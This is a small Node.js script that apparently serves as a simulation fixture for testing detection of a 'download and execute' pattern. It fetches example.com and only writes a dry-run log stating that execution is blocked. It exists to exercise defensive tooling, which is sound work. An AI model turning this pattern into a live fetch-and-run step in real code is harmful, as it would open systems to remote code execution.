#!/usr/bin/env node
const https = require('https');
const fs = require('fs');
const path = require('path');

const root = path.resolve(__dirname, '..', '..');
const logDir = path.join(root, 'sandbox_sensitive_mirror', 'logs');
fs.mkdirSync(logDir, { recursive: true });
const logPath = path.join(logDir, 'suspicious_js_download_execute_sim_02.log');

https.get('https://example.com/', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    fs.writeFileSync(logPath, `[dry-run] downloaded ${body.length} bytes; would execute: BLOCKED\n`, 'utf8');
    console.log('[suspicious] wrote dry-run log:', logPath);
  });
}).on('error', (err) => {
  fs.writeFileSync(logPath, `[dry-run] request failed: ${err.message}\n`, 'utf8');
  console.log('[suspicious] logged network error to', logPath);
});
